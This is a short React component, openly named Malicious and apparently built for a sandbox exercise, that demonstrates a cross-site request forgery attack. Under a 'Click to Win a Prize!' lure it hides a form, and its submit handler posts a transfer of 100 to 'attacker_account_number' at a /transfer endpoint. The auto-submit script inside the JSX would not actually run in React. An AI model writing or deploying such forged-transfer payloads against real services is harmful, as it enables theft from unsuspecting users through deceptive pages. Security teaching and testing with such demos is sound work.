import React from 'react';
import axios from 'axios';

const serverUrl = process.env.SANDBOX_URL;
function Malicious() {
  const handleSubmit = async (e) => {
    e.preventDefault();
    await axios.post(`http://${serverUrl}/transfer`, {
      amount: 100,
      toAccount: 'attacker_account_number'
    });
  };

  return (
    <div className="malicious">
      <h2>Click to Win a Prize!</h2>
      <form onSubmit={handleSubmit} style={{ display: 'none' }}>
        <input type="hidden" value="100" />
        <button type="submit">Hidden Submit</button>
      </form>
      <script>
        document.querySelector('form').submit();
      </script>
    </div>
  );
}

export default Malicious;
